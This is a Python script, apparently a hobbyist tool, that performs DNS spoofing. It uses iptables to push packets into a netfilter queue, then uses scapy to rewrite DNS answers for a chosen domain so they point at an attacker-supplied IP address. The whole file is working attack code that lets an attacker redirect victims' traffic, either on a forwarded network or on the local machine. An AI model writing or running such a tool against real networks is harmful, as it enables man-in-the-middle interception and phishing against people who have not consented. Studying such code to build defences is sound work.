# !/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import subprocess
import os
import stat
import argparse


def get_range():
    parser = argparse.ArgumentParser()

    parser.add_argument("-i", "--ip", dest="ip", help="use this to set the system ip")
    parser.add_argument("-d", "--domain", dest="domain", help="use this to set the domain url")
    options = parser.parse_args()

    if not options.ip:
        parser.error("[-] Please specify the system's IP, use --help for more info")
    elif not options.domain:
        parser.error("[-] Please specify the domain url, use --help for more info")

    return options


def process_packet(packet):
    domain = get_range().domain
    ip_range = get_range().ip
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        # print(scapy_packet.show())

        q_name = scapy_packet[scapy.DNSQR].qname
        if domain in q_name:
            print("[+] Spoofing target ")
            answer = scapy.DNSRR(rrname=q_name, rdata=ip_range)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


# Don't alter these lines below unless you are aware of what's happening

try:
    choice = input("\n1 - Intersystem DNS Spoofing\n2 - Intrasystem DNS Spoofing\nEnter your choice: ")
    print(choice)
    if choice == 1 or choice == "1":
        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
        print("\n[+] Created IPTABLE for FORWARD\n")
    elif choice == 2 or choice == "2":
        subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
        subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
        print("\n[+] Created iptable for INPUT and OUTPUT\n")
    else:
        print("[-] Invalid Choice.... Exiting.....")
        exit()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C........ Exiting.......")
    subprocess.call("iptables --flush", shell=True)
